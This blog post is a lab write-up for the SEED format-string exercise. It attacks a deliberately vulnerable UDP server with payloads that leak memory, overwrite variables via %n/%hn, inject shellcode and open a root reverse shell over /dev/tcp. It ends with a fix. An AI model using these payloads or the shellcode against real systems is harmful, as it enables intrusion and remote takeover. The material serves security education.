---
title: Format-String
date: 2020-01-25 00:16:14
tags: [Security]
series: [blog]
featured: true
toc: true
comments: true
---

![](images/Format-String/Platform-SEEDUbuntu16__04--32bit-green.svg)  ![](images/Format-String/SEED-SoftwareSecurityLab-brightgreen.svg)

Table of Contents
=================

* [Preparation](#preparation)
    * [1. 什么是格式化字符串](#1-什么是格式化字符串)
    * [2. 栈与格式化字符串](#2-栈与格式化字符串)
    * [3. 如果参数数量不匹配](#3-如果参数数量不匹配)
    * [4. 访问任意位置内存](#4-访问任意位置内存)
    * [5. 在内存中写一个数字](#5-在内存中写一个数字)
* [Task 1: The Vulnerable Program](#task-1-the-vulnerable-program)
* [Task 2: Understanding the Layout of the Stack](#task-2-understanding-the-layout-of-the-stack)
* [Task 3: Crash the Program](#task-3-crash-the-program)
* [Task 4: Print Out the Server Program’s Memory](#task-4-print-out-the-server-programs-memory)
    * [Task 4-A: Stack Data](#task-4-a-stack-data)
    * [Task 4-B: Heap Data](#task-4-b-heap-data)
* [Task 5: Change the Server Program’s Memory](#task-5-change-the-server-programs-memory)
    * [Task 5-A: Change the value to a different value](#task-5-a-change-the-value-to-a-different-value)
    * [Task 5-B: Change the value to 0x500](#task-5-b-change-the-value-to-0x500)
    * [Task 5-C: Change the value to 0xff990000](#task-5-c-change-the-value-to-0xff990000)
* [Task 6: Inject Malicious Code into the Server Program](#task-6-inject-malicious-code-into-the-server-program)
* [Task 7: Getting a Reverse Shell](#task-7-getting-a-reverse-shell)
* [Task 8 Fix the problem](#task-8-fix-the-problem)
* [Conclusion](#conclusion)


## Preparation

### 1. 什么是格式化字符串

```
printf ("The magic number is: %d", 1911);
```

试观察运行以上语句，会发现字符串"The magic number is: %d"中的格式符％d被参数（1911）替换，因此输出变成了“The magic number is: 1911”。 格式化字符串大致就是这么一回事啦。

除了表示十进制数的％d，还有不少其他形式的格式符，一起来认识一下吧~

| 格式符 |                含义                |           含义（英）           |      传      |
| :----: | :--------------------------------: | :----------------------------: | :----------: |
|   %d   |          十进制数（int）           |            decimal             |      值      |
|   %u   |   无符号十进制数 (unsigned int)    |        unsigned decimal        |      值      |
|   %x   |     十六进制数 (unsigned int)      |          hexadecimal           |      值      |
|   %s   | 字符串 ((const) (unsigned) char *) |             string             | 引用（指针） |
|   %n   |  %n符号以前输入的字符数量 (* int)  | number of bytes written so far | 引用（指针） |

（ * **%n**的使用将在1.5节中做出说明）

### 2. 栈与格式化字符串

格式化函数的行为由格式化字符串控制，`printf`函数从栈上取得参数。

```c
printf ("a has value %d, b has value %d, c is at address: %08x\n",a, b, &c); 
```

[![img](Format-String/687474703a2f2f692e696d6775722e636f6d2f67647470567a582e706e67.png)](https://camo.githubusercontent.com/d2f455509a89cc529863576ff47d3468ddb9553c/687474703a2f2f692e696d6775722e636f6d2f67647470567a582e706e67)

### 3. 如果参数数量不匹配

会发生什么？ 如果只有一个不匹配会发生什么？

```c
printf ("a has value %d, b has value %d, c is at address: %08x\n",a, b);
```

-   在上面的例子中格式字符串需要3个参数，但程序只提供了2个。
-   该程序能够通过编译么？
    -   `printf()`是一个参数长度可变函数。因此，仅仅看参数数量是看不出问题的。
    -   为了查出不匹配，编译器需要了解`printf()`的运行机制，然而编译器通常不做这类分析。
    -   有些时候，格式字符串并不是一个常量字符串，它在程序运行期间生成(比如用户输入)，因此，编译器无法发现不匹配。
-   那么`printf()`函数自身能检测到不匹配么？
    -   `printf()`从栈上取得参数，如果格式字符串需要3个参数，它会从栈上取3个，除非栈被标记了边界，p`rintf()`并不知道自己是否会用完提供的所有参数。
    -   既然没有那样的边界标记。`printf()`会持续从栈上抓取数据，在一个参数数量不匹配的例子中，它会抓取到一些不属于该函数调用到的数据。
-   如果有人特意准备数据让`printf()`抓取会发生什么呢？

### 4. 访问任意位置内存

-   我们需要得到一段数据的内存地址，但我们无法修改代码，供我们使用的只有格式字符串。
-   如果我们调用 `printf(%s) `时没有指明内存地址, 那么目标地址就可以通过`printf`函数，在栈上的任意位置获取。`printf`函数维护一个初始栈指针,所以能够得到所有参数在栈中的位置
-   观察: 格式字符串位于栈上. 如果我们可以把目标地址编码进格式字符串，那样目标地址也会存在于栈上，在接下来的例子里，格式字符串将保存在栈上的缓冲区中。

```c
int main(int argc, char *argv[])
{
	char user_input[100];
	... ... /* other variable definitions and statements */
	scanf("%s", user_input); /* getting a string from user */
	printf(user_input); /* Vulnerable place */
	return 0;
}
```

- 如果我们让`printf`函数得到格式字符串中的目标内存地址 (该地址也存在于栈上), 我们就可以访问该地址.

    ```c
    printf ("\x10\x01\x48\x08 %x %x %x %x %s");
    ```

- `\x10\x01\x48\x08` 是**目标地址**的四个字节， 在C语言中, `\x10 `告诉编译器将一个16进制数`0x10`放于当前位置（占1字节）。如果去掉前缀`\x10`就相当于两个`ascii`字符1和0了，这就不是我们所期望的结果了。

- %x 导致**栈指针向格式字符串的方向移动**（参考第2节）

- 下图解释了攻击方式，如果用户输入中包含了以下格式字符串 [![img](Format-String/687474703a2f2f692e696d6775722e636f6d2f67486d534358362e706e67.png)](https://camo.githubusercontent.com/3a0ed72413b394a5ec453e069c2d64bfc5d28d60/687474703a2f2f692e696d6775722e636f6d2f67486d534358362e706e67)

- 如图所示，我们使用四个%x来移动`printf`函数的栈指针到我们存储格式字符串的位置，一旦到了目标位置，我们使用％s来打印，它会打印位于地址`0x10014808`的内容，因为是将其作为字符串来处理，所以会一直打印到结束符为止。

- user_input数组到传给`printf`函数参数的地址之间的栈空间不是为了`printf`函数准备的。但是，因为程序本身存在格式字符串漏洞，所以`printf`会把这段内存当作传入的参数来匹配％x。

- 最大的挑战就是想方设法找出`printf`函数栈指针(函数取参地址)到user_input数组的这一段距离是多少，这段距离决定了你需要在%s之前输入多少个%x。

### 5. 在内存中写一个数字

 **%n: 该符号前输入的字符数量会被存储到对应的参数中去**

```c
int i;
printf ("12345%n", &i);
```

-   数字5（**%n前的字符数量**）将会被写入i 中
-   运用同样的方法在访问任意地址内存的时候，我们可以将一个数字写入指定的内存中。只要将上一小节(1.4)的%s替换成%n就能够覆盖`0x10014808`的内容。
-   利用这个方法，攻击者可以做以下事情:
    -   重写程序标识控制访问权限
    -   重写栈或者函数等等的返回地址
-   然而，写入的值是由%n之前的字符数量决定的。真的有办法能够写入任意数值么？
    -   用最古老的计数方式， 为了写1000，就填充1000个字符吧。
    -   为了防止过长的格式字符串，我们可以使用一个宽度指定的格式指示器。(比如（%0数字x）就会左填充预期数量的0符号)

## Task 1: The Vulnerable Program

```shell
sudo  sysctl -w kernel.randomize_va_space=0
```

Download program `server.c` and compile it.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>

#define PORT 9090

char *secret = "A secret message\n";
unsigned int  target = 0x11223344;

void myprintf(char *msg){
    printf("The address of the 'msg' argument: 0x%.8x\n", (unsigned) &msg);
    // This line has a format-string vulnerability
    printf(msg);
    printf("The value of the 'target' variable (after): 0x%.8x\n", target);
}

// This function provides some helpful information. It is meant to
//   simplify the lab task. In practice, attackers need to figure
//   out the information by themselves.
void helper(){
    printf("The address of the secret: 0x%.8x\n", (unsigned) secret);
    printf("The address of the 'target' variable: 0x%.8x\n", 
            (unsigned) &target);
    printf("The value of the 'target' variable (before): 0x%.8x\n", target);
}

void main(){
    struct sockaddr_in server;
    struct sockaddr_in client;
    int clientLen;
    char buf[1500];
    helper();
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    memset((char *) &server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = htonl(INADDR_ANY);
    server.sin_port = htons(PORT);

    if (bind(sock, (struct sockaddr *) &server, sizeof(server)) < 0)
        perror("ERROR on binding");

    while (1) {
        bzero(buf, 1500);
        recvfrom(sock, buf, 1500-1, 0,
                 (struct sockaddr *) &client, &clientLen);
        myprintf(buf);
    }
    close(sock);
}
```

use command below:

```shell
gcc -z execstack -o server server.c
server.c: In function myprintf:
server.c:13:5: warning: format not a string literal and no format arguments[-Wformat-security]printf(msg);
	ˆ
```

Ignore the warning.

```shell
# on the server VM
$ sudo ./server

# On the client VM
$ nc -u 10.0.2.5 9090(use 127.0.0.1 to substitute 10.0.2.5 in the same VM)
```

**Then you will find what you input in client will be output in server VM.**

## Task 2: Understanding the Layout of the Stack

![](images/Format-String/Screenshot%20from%202019-11-15%2021-10-21.png)

Observe the assembly code of `server` to find the return address of `myprintf()`.

```shell
$ objdump -d server>server.out
```



![](images/Format-String/Screenshot%20from%202019-11-15%2008-13-44.png)

This is assembly part of main, we can find the return address of `myprintf()` is `0x0804872d`.

Then we need to find **where the return address is stored in stack**.

We can use `%p` to print the stack, or we can use `%.8x` instead.

When inputing `%p` in client VM, it shows `0xbf9dfa10`, and when using `%.8x` it shows `bf9dfa10`. Both make sense.

So we use:

```shell
$%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|
```

Then we got:

```shell
[11/21/19]seed@VM:~/.../formatString$ sudo ./server 
The address of the secret: 0x080487c0
The address of the 'target' variable: 0x0804a040
The value of the 'target' variable (before): 0x11223344
The address of the 'msg' argument: 0xbffff0a0
0xbffff0a0|0xb7fba000|0x804871b|0x3|0xbffff0e0|0xbffff6c8|0x804872d|0xbffff0e0|0xbffff0b8|0x10|0x804864c|0xb7e1b2cd|0xb7fdb629|0x10|0x3|0x82230002|(nil)|(nil)|(nil)|0x940002|0x1|0xb7fff000|0xb7fff020|0x257c7025|0x70257c70|0x7c70257c|0x257c7025|0x70257c70|0x7c70257c|0x257c7025|0x70257c70|0x7c70257c|0x257c7025|0x70257c70|0x7c70257c|0x257c7025|
```

We can find that:

```mark
(stack top)
|format str|
|0xbffff0a0| the address of msg
|0xb7fba000|
...
|0x0804872d| the return address of myprintf
|0xbffff0e0| the value of msg
...
(stack base)
```

The distance between format string and the value of `msg` is $8*4=32\ bytes$. And we got the address of `msg` is `0xbffff0a0`, the value of `msg` is `0xbffff0e0`. The we got the address of format string is `0xbffff0a0` - 32 = `0xbffff080`.

So, 

- Question 1: What are the memory addresses at the locations marked by ➊, ➋, and ➌? 

    1. The address of format string is `0xbffff080`;

    2. The address of return address of `myprintf()` is `0xbffff0a0 - 4 = 0xbffff09c`

    3. The address of buff is `0xbffff0e0`(input value is the address of buff);

- Question 2: What is the distance between the locations marked by ➊ and ➌?

    The distance between 1 and 3 is `0x080-0x0e0=0x60=96 bytes`.

## Task 3: Crash the Program

To crash the program, we have some tricks.

```text
%08x.%08x.%08x 打印的是接下来几个地址对应的地址
%3$x 获取第三个参数利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。
利用 %s 来获取变量所对应地址的内容，只不过有零截断。
利用 %order$x 来获取指定参数的值，
利用 %order$s 来获取指定参数对应地址的内容。
```

So we have noticed that there is a ` 0x3 ` in the stack, if we try to read it as address, it will crash the program.

type in the client VM:

```c
%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
```

We made it.

## Task 4: Print Out the Server Program’s Memory

### Task 4-A: Stack Data

To print out the stack data, just type in `%.8x` or `%p`.

```c
%.8x|%.8x|%.8x|%.8x|%.8x|%.8x|%.8x|%.8x|%.8x|%.8x|
```

### Task 4-B: Heap Data

To print out the value of the secret `msg`, we need construct a payload use python. Since we already own its address, it’s easy to do so. **From above questions we have find the distance between stack pointer and buffer array is 96 bytes. We use 23 %p to move the stack pointer from its current position to the buffer array where stores our input(the address of secret message). The the 24-th one, the ‘%s’ indicates the `printf()` function should print the content in the array as an address. So it will find the value in that address. **

```shell
$ echo $(printf "\xc0\x87\x04\x08")%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%s | nc 127.0.0.1 9090
// Or we can save the data in a file
$ echo $(printf "\xc0\x87\x04\x08")%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%s > input
$ nc 127.0.0.1 9090 < input
```

Note that most computers are small-endian machines.

## Task 5: Change the Server Program’s Memory

### Task 5-A: Change the value to a different value

In this sub-task, we need to change the content of the `target` variable to something else. Your task is considered as a success if you can change it to a different value, regardless of what value it may be. 

We have known that the address of target is `0x0804a040`

```shell
$ echo $(printf "\x40\xa0\x04\x08")%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%n > input5a
$ nc 127.0.0.1 9090 < input5a
```

Then we find the value of target was modified to

```shell
The value of the 'target' variable (after): 0x000000b5
```

### Task 5-B: Change the value to `0x500`

In this sub-task, we need to change to the content of the `target` variable to a specific value 0x500. Your task is considered as a success only if the variable’s value becomes 0x500. 

`0x500`-`0xb3` = 1101, we need add 1101 characters before %p.

```shell
$ echo $(printf "\x40\xa0\x04\x08")*********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%n > input2
$ nc 127.0.0.1 9090 < input2
```

Output:

```shell
@�*********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************0xbffff0a00xb7fba0000x804871b0x30xbffff0e00xbffff6c80x804872d0xbffff0e00xbffff0b80x100x804864c0xb7e1b2cd0xb7fdb6290x100x30x82230002(nil)(nil)(nil)0x3bae00020x100007f(nil)(nil)
The value of the 'target' variable (after): 0x00000500
```

### Task 5-C: Change the value to `0xff990000`

This sub-task is similar to the previous one, except that the target value is now a large number. Printing out this large number of characters may take hours. 

The basic idea is to use `%hn`, instead of %n, **so we can modify a two-byte memory space**, instead of four bytes. Printing out 2<sup>16</sup>  characters does not take much time. We can break the memory space of the target variable into two blocks of memory, each having two bytes. We just need to set one block to `0xFF99` and set the other one to `0x0000`. 

**This means that in your attack, you need to provide two addresses** in the format string. In format string attacks, changing the content of a memory space to a very small value is quite challenging (please explain why in the report); `0x00` is an extreme case. To achieve this goal, we need to use an overflow technique. The basic idea is that when we make a number larger than what the storage allows, only the lower part of the number will be stored (basically, there is an integer overflow).

For example, if the number 2<sup>16</sup> + 5 is stored in a 16-bit memory space, only 5 will be stored. Therefore, to get to zero, we just need to get the number to 2<sup>16</sup> = 65536.

In this sub-task, we need use `%hn` to substitute `%n`. It will modify half word. So to change the value to `0xff990000`, we need to modify it by `0xff99` and `0x0000`, but 0 is impossible, we should implement this by overflow.  

The two address is `0x0804a040 ` and `0x0804a042`, we need change the first two bytes into `0x10000`, and use `0xff99` to cover the overflow `0x1`.  

```shell
echo $(printf "\x42\xa0\x04\x08\x22\x22\x22\x22\x40\xa0\x04\x08")%655069x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%hn%0103x%hn > input5c
$ nc -u 127.0.0.1 9090 < input5c
```

Output:

```shell
                                                                                                                                                                                                                                                                                                 bfb1e0e0b76e0000 804871b       3bfb1e120bfb1e708 804872dbfb1e120bfb1e0f8      10 804864cb75412cdb7701629      10       382230002       0       0       0eae60002 100007f       0       00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000022222222
The value of the 'target' variable (after): 0xff990000
```



## Task 6: Inject Malicious Code into the Server Program

In this task we need modify the return address to the shell code. 

To get the offset, we need to push some `nop(0x90)`into the buffer array and get the offset.

Using `gdb` file, we get:

```markdown
the value of msg(the address of buf): 0xbfffe718
the return address: 0xbfffe740
the address of msg: 0xbfffe700
the address of the return address: 0xbfffe6bc
```

So we construct a payload:

```shell
$ echo $(printf "\xbc\x6f\xff\xbf")%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%hn$(printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90") >input
$ nc -u 127.0.0.1 9090 < input
```

Then we find the `nop` were injected in the area of `0xbfffe790`, we get the offset = `0xbfffe790-0xbfffe718=0x78`.

So we can modify the return address into `0xbffff0e0+0x78=bffff158`.

Use the same idea in Task 5-C, we need change the two-byte at `0xbffff09c` and the two-byte at `0xbffff09e`. It’s origin value is `0x0804872d`, we get `0xbfff-3*4-22*4=48963`, and `0xf158-0xbfff=12633`, Then we try to construct a payload below. Trying a few times and change the value of the second value into 12611, we succeed.

```shell
$ echo $(printf "\x9e\xf0\xff\xbf\x11\x11\x11\x11\x9c\xf0\xff\xbf")%048963x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%hn%012611x%hn$(printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\\x31\xc0\x50\x68bash\x68////\x68/bin\x89\xe3\x31\xc0\x50\x68-ccc\x89\xe0\x31\xd2\x52\x68ile \x68/myf\x68/tmp\x68/rm \x68/bin\x89\xe2\x31\xc9\x51\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80") > input6
$ nc -u 127.0.0.1 9090 <input6
```

Output:

```shell
[11/21/19]seed@VM:/tmp$ touch myfile
[11/21/19]seed@VM:/tmp$ ls
config-err-9j0iw4
myfile
systemd-private-d58ef22a100b4a8d92cde9ff2620e54e-colord.service-4AAjYt
systemd-private-d58ef22a100b4a8d92cde9ff2620e54e-rtkit-daemon.service-SaKdq1
unity_support_test.1
[11/21/19]seed@VM:/tmp$ ls
config-err-9j0iw4
systemd-private-d58ef22a100b4a8d92cde9ff2620e54e-colord.service-4AAjYt
systemd-private-d58ef22a100b4a8d92cde9ff2620e54e-rtkit-daemon.service-SaKdq1
unity_support_test.1
[11/21/19]seed@VM:/tmp$ 
```

## Task 7: Getting a Reverse Shell

To get a reverse shell, all we need is change somewhere in the shell code.

We need to split `/bin/bash -i > /dev/tcp/127.0.0.1/7070 0<&1 2>&1` and substitute code between line  1 and line 2,

that is:

```c
"\x31\xc0" // xorl %eax, %eax : eax = 0
"\x50" // pushl $eax : 0 marks the end of a string
"\x68""bash" // pushl "bash"
"\x68""////" // pushl "////" : "////" is equivalent to "/"
"\x68""/bin" // pushl "/bin"
"\x89\xe3" // movl %esp, %ebx : Save the string address to ebx
// Push "-ccc" into stack.
"\x31\xc0" // xorl %eax, %eax " eax = 0
"\x50" // pushl $eax : 0 marks the end of a string
"\x68""-ccc" // pushl "-ccc" : "-ccc" is equivalent to "-c"
"\x89\xe0" // movl %esp, %eax : Save the string address to eax
// Push "/bin/rm /tmp/myfile " into stack.
"\x31\xd2" // xorl %edx, %edx : edx = 0
"\x52" // pushl %edx : 0 marks the end of a string
"\x68""ile " // pushl "ile " ➀
"\x68""/myf" // pushl "/myf"
"\x68""/tmp" // pushl "/tmp"
"\x68""/rm " // pushl "/rm "
"\x68""/bin" // pushl "/bin" ➁
"\x89\xe2" // movl %esp,%edx : Save the string address to edx
"\x31\xc9" // xorl %ecx, %ecx
"\x51" // pushl %ecx : argv[3] = 0
"\x52" // pushl %edx : argv[2] = address of "/bin/rm ..."
"\x50" // pushl %eax : argv[1] = address of "-c"
"\x53" // pushl %ebx : argv[0] = address of "/bin/bash"
"\x89\xe1" // movl %esp, %ecx : Save argv[]’s address to ecx
"\x31\xd2" // xorl %edx, %edx : Let edx = 0
"\x31\xc0" // xorl %eax, %eax
"\xb0\x0b" // movb $0x0b, %al : 0x0b is execve()’s number
"\xcd\x80" // int 0x80 : Invoke the execve() system call
```

We can split that command into:

```shell
\x68/bin
\x68/bas
\x68h -i
\x68 > /
\x68dev/
\x68tcp/
\x68127.
\x680.0.
\x681/70
\x6870 0
\x68<&1 
\x682>&1
```

and then we get the payload:

```shell
$ echo $(printf "\x9e\xf0\xff\xbf\x11\x11\x11\x11\x9c\xf0\xff\xbf")%048963x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%hn%012611x%hn$(printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\\x31\xc0\x50\x68bash\x68////\x68/bin\x89\xe3\x31\xc0\x50\x68-ccc\x89\xe0\x31\xd2\x52\x682>&1\x68<&1 \x6870 0\x681/70\x680.0.\x68127.\x68tcp/\x68dev/\x68 > /\x68h -i\x68/bas\x68/bin\x89\xe2\x31\xc9\x51\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80") > input7
$ nc -u 127.0.0.1 9090 <input7
```

Output:

```shell
[11/21/19]seed@VM:~/.../formatString$ nc -l 7070 -v
Listening on [0.0.0.0] (family 0, port 7070)
Connection from [127.0.0.1] port 7070 [tcp/*] accepted (family 2, sport 57044)
root@VM:/home/seed/Documents/SoftwareSecurity/formatString# who am i
who am i
root@VM:/home/seed/Documents/SoftwareSecurity/formatString# whoami
whoami
root
root@VM:/home/seed/Documents/SoftwareSecurity/formatString# ls
ls
input1
input2
input3
input5a
input5b
input5c
input6
input7
peda-session-server.txt
server
server.c
server.s
root@VM:/home/seed/Documents/SoftwareSecurity/formatString# touch b.txt
touch b.txt
root@VM:/home/seed/Documents/SoftwareSecurity/formatString# ls
ls
b.txt
input1
input2
input3
input5a
input5b
input5c
input6
input7
peda-session-server.txt
server
server.c
server.s
```

Now we have got the root shell!

## Task 8 Fix the problem

Remember the warning message generated by the `gcc` compiler? Please explain what it means. Please fix the vulnerability in the server program, and recompile it. Does the compiler warning go away? Do your attacks still work? You only need to try one of your attacks to see whether it still works or not.

change `printf(msg);` into `printf("%s", msg);` recompile that.

```shell
$ cp server.c server2.c
# after modify the server2.c
$ gcc -z execstack -o server2 server2.c
$ sudo ./server2
$ nc -u 127.0.0.1 9090
```

Then we find when we input `%p%p%p` on client VM, it will no longer print out the stack.

```shell
[11/21/19]seed@VM:~/.../formatString$ nc -u 127.0.0.1 9090
test
%p%p%p%p%p
```

```shell
[11/21/19]seed@VM:~/.../formatString$ cp server.c server2.c
[11/21/19]seed@VM:~/.../formatString$ subl server2.c 
[11/21/19]seed@VM:~/.../formatString$ gcc -z execstack -o server2 server2.c 
[11/21/19]seed@VM:~/.../formatString$ sudo ./server2
The address of the secret: 0x080487c0
The address of the 'target' variable: 0x0804a040
The value of the 'target' variable (before): 0x11223344
The address of the 'msg' argument: 0xbffff0a0
test
The value of the 'target' variable (after): 0x11223344
The address of the 'msg' argument: 0xbffff0a0
%p%p%p%p%p
The value of the 'target' variable (after): 0x11223344

```

## Conclusion

A good lab!!!!